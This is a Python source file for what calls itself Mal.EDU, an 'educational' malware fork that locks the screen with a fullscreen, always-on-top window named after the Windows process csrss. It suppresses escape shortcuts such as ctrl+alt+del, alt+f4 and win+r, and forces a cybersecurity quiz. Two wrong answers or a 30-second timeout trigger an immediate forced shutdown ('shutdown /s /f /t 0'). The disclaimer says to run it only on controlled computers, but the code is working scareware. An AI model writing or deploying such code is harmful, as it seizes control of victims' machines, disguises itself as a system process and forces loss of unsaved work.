import tkinter as tk
from PIL import Image, ImageTk
from tkinter import messagebox, simpledialog
import sys
import os
import keyboard
import time
import random
#time.sleep(3)



"""Welcome to the code! If you wish to build yourself, be sure to read the WHOLE readme in Github."""
"""Please respect the GPLv3 lisense and give credit where it is due ;)"""

""""This is a fork of Mal.EDU from v0.3 'yellow'. Now the user must finish a quiz!... or find a way around it I did not think of lol """

""""⚠ DO NOT USE ANYTHING WITHIN THIS FILE FOR MALICIOUS PURPOSES. YOU ARE TO ONLY USE MAL.EDU ON A CONTROLLED COMPUTER."""
#that is a warning.


QUESTIONS = [
    {
        "question": "What is phishing?",
        "options": {
            "A": "A type of fish found in northern lakes.",
            "B": "A security term describing a friendly greeting.",
            "C": "A method of trying to gather personal information using deceptive e-mails and websites.",
        },
        "correct": "C"
    },
    {
        "question": "Which one is considered a strong password?",
        "options": {
            "A": "123456",
            "B": "password",
            "C": "A password that contains at least 8 characters, including letters, numbers, and special symbols.",
        },
        "correct": "C"
    },
    {
        "question": "What does HTTPS stand for?",
        "options": {
            "A": "Hyper Text Transfer Protocol Secure",
            "B": "High Transfer Protocol System",
            "C": "Hyperlink Tracking Process System",
        },
        "correct": "A"
    },

    {
    "question": "Which of the following is a type of malware designed to block access to a computer system until a sum of money is paid?",
    "options": {
        "A": "Virus",
        "B": "Ransomware",
        "C": "Spyware"
    },
    "correct": "B"
    },
    {
        "question": "What is the purpose of a firewall?",
        "options": {
            "A": "To speed up network traffic",
            "B": "To protect a computer network from unauthorized access",
            "C": "To monitor data usage on a network"
        },
        "correct": "B"
    },
    {
        "question": "Which of the following is a common method used in social engineering attacks?",
        "options": {
            "A": "Phishing",
            "B": "Encryption",
            "C": "Tokenization"
        },
        "correct": "A"
    },
    {
        "question": "What does the term 'Zero-Day' vulnerability mean?",
        "options": {
            "A": "A vulnerability that is known to the software vendor but not yet fixed",
            "B": "A vulnerability that both attackers and the software vendor are unaware of",
            "C": "A vulnerability that attackers exploit before the software vendor is aware of it"
        },
        "correct": "C"
    },
    {
        "question": "What is the main difference between a worm and a virus?",
        "options": {
            "A": "A worm is capable of self-replicating and spreading independently, while a virus needs human action to spread",
            "B": "A virus is more harmful than a worm",
            "C": "A worm is not malicious software"
        },
        "correct": "A"
    },
    {
        "question": "What is the principle of 'least privilege'?",
        "options": {
            "A": "Giving users only the permissions they need to perform their work",
            "B": "Encrypting all sensitive data at rest and in transit",
            "C": "Requiring strong passwords for all user accounts"
        },
        "correct": "A"
    },
    {
        "question": "What does VPN stand for and what is its primary purpose?",
        "options": {
            "A": "Virtual Public Network, to provide faster Internet access",
            "B": "Very Private Network, to secure personal web browsing",
            "C": "Virtual Private Network, to create a secure connection over the internet"
        },
        "correct": "C"
    },
    {
        "question": "Which of the following best describes 'Two-Factor Authentication'?",
        "options": {
            "A": "Using two different passwords to access your account",
            "B": "Using two devices for every online account",
            "C": "Combining something you know with something you have or are, to verify identity"
        },
        "correct": "C"
    },
    {
        "question": "What is the main purpose of an Intrusion Detection System (IDS)?",
        "options": {
            "A": "To prevent unauthorized access to or from a private network",
            "B": "To detect unauthorized access to or from a network and alert the system or network administrator",
            "C": "To encrypt network traffic"
        },
        "correct": "B"
    },
    {
        "question": "Which of the following is NOT a common type of cyber attack?",
        "options": {
            "A": "Man-in-the-middle attack",
            "B": "All-in-one attack",
            "C": "Denial of Service attack"
        },
        "correct": "B"
    }

    # Add more questions as needed
]

#determine the actual number of questions to use, based on the available questions
NUM_QUESTIONS = min(len(QUESTIONS), random.randint(7, 12))
selected_questions = random.sample(QUESTIONS, k=NUM_QUESTIONS)




correct_answers = 0
wrong_answers = 0 #max of 2 before it closes
timer_count = 30  #quiz timer. set to 30 s.
current_question_number = 1  #start with the first question

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# def on_focus_out(event):
#     def check_focus():
#         if not root.focus_displayof():
#             root.destroy()
#     root.after(100, check_focus)

def submit_answer(user_answer, correct_answer):
    global correct_answers, wrong_answers
    if user_answer == correct_answer:
        correct_answers += 1
        status_label.config(text="Gah! You got it correct?!!", fg="green")
    else:
        wrong_answers += 1
        status_label.config(text="Bff! Your answer is INCORRECT!\nThis is just too easy...", fg="red")
    
    if wrong_answers >= 2:
        status_label.config(text="Muah ha ha! Outsmarted by me! Better luck next time....\n\n", fg="red")
        time.sleep(3)
        os.system("shutdown /s /f /t 0")
        root.after(500, root.destroy)  #delay
        
    elif len(selected_questions) == 0 and correct_answers >= NUM_QUESTIONS - wrong_answers:
        status_label.config(text="What!?! You did it?! \nI will be back before you can stop me for good!", fg="green")
        root.after(4000, root.destroy)  #delay before closing so they know what even happened
    else:
        root.after(500, ask_question)  #short delay before next question

def update_timer():
    global timer_count
    if timer_count > 0:
        timer_count -= 1
        timer_label.config(text=f"Time left: {timer_count}s")
        root.after(1000, update_timer)  #update every second
    else:
        status_label.config(text="Muah ha ha! You ran out of time! Perhaps next attempt you will get it... \nNOT!!! Ha! I win!", fg="red")
        time.sleep(3)
        os.system("shutdown /s /f /t 0")
        root.after(500, root.destroy)  #end the quiz if the time runs out
        


def ask_question():
    global question_frame, current_question_number, correct_answers, wrong_answers
    if selected_questions:
        current_question = selected_questions.pop(0)
        question_text = current_question["question"]
        
        #clear previous question content
        for widget in question_frame.winfo_children():
            widget.destroy()

        question_counter_label.config(text=f"Question {current_question_number} of {NUM_QUESTIONS}")
        current_question_number += 1  #prep for next q
        
        question_label = tk.Label(question_frame, text=question_text, font=('Helvetica', 16), bg='white')
        question_label.pack()
        
        for option, description in current_question["options"].items():
            btn = tk.Button(question_frame, text=f"{option}: {description}", command=lambda option=option: submit_answer(option, current_question["correct"]))
            btn.pack(pady=5)
    else:
        root.destroy()

root = tk.Tk()
root.title("csrss")
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
# root.bind("<FocusOut>", on_focus_out)



def print_number(num):
    print(num)
#key blockers
keyboard.add_hotkey("alt + f4", lambda: None, suppress =True)
keyboard.add_hotkey("alt + tab", lambda: None, suppress =True)
keyboard.add_hotkey("win + tab", lambda: None, suppress =True)
keyboard.add_hotkey("ctrl + esc", lambda: None, suppress =True)
keyboard.add_hotkey("win", lambda: None, suppress =True)
keyboard.add_hotkey('ctrl+alt+f4', lambda: None, suppress=True)
keyboard.add_hotkey('ctrl+shift+esc', lambda: None, suppress=True)
keyboard.add_hotkey('f11', lambda: None, suppress=True)
keyboard.add_hotkey('win+ctrl+d', lambda: None, suppress=True)
keyboard.add_hotkey('win+l', lambda: None, suppress=True)
keyboard.add_hotkey('win+r', lambda: None, suppress=True)
keyboard.add_hotkey('win+g', lambda: None, suppress=True)
keyboard.add_hotkey('alt+esc', lambda: None, suppress=True)
#loop to register each hotkey from 'win+1' to 'win+0'
for i in range(1, 10):
    keyboard.add_hotkey(f'win+{i}', lambda i=i: print_number(i), suppress=True)
keyboard.add_hotkey('win+0', lambda: print_number(0), suppress=True)
keyboard.add_hotkey('win+shift+0', lambda: print_number(0), suppress=True)
keyboard.add_hotkey('ctrl+alt+del', lambda: None, suppress=True)


icon_path = resource_path('icon.ico')
root.iconbitmap(default=icon_path)

image_path = resource_path('img.jpg')
img = Image.open(image_path)
img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.Resampling.LANCZOS)
photoImg = ImageTk.PhotoImage(img)

background_label = tk.Label(root, image=photoImg)
background_label.place(x=0, y=0, relwidth=1, relheight=1)

question_frame = tk.Frame(root, bg='white')
question_frame.pack(pady=50)

timer_label = tk.Label(root, text=f"Time left: {timer_count}s", font=('Helvetica', 14), bg='white')
timer_label.pack(side="top", fill="x")
status_label = tk.Label(root, text="", font=('Helvetica', 14), bg='white')
question_counter_label = tk.Label(root, text=f"Question {current_question_number} of {NUM_QUESTIONS}", font=('Helvetica', 14), bg='white')
question_counter_label.pack(side="top", fill="x")
status_label.pack(side="bottom", fill="x")

root.after(1000, ask_question) 
root.after(1000, update_timer)  

root.mainloop()